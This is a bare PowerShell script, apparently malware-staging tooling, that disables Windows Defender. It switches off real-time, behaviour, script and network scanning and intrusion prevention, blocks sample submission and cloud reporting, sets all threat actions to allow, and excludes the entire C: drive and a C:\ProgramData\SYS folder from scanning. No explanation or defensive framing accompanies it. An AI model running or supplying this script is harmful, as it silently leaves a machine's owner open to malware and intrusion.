cd C:\Windows\system32
Write-Host "[+] Disable Windows Defender (as $(whoami))"
Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Ignore;
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Ignore;
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Ignore;
Set-MpPreference -DisableIOAVProtection $true -ErrorAction Ignore;
Set-MpPreference -DisablePrivacyMode $true -ErrorAction Ignore;
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction Ignore;
Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinu
Set-MpPreference -DisableArchiveScanning $true -ErrorAction Ignore;
Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction Ignore;
Set-MpPreference -DisableScriptScanning $true -ErrorAction Ignore;
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Ignore;
Set-MpPreference -MAPSReporting 0 -ErrorAction Ignore;
Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction Ignore;
Set-MpPreference -ModerateThreatDefaultAction 6 -ErrorAction Ignore;
Set-MpPreference -LowThreatDefaultAction 6 -ErrorAction Ignore;
Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction Ignore;
Add-MpPreference -ExclusionPath "C:\"
Add-MpPreference -ExclusionPath "C:\*"
Add-MpPreference -ExclusionPath "C:\ProgramData\SYS"
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -SubmitSamplesConsent NeverSend
Set-MpPreference -MAPSReporting Disable
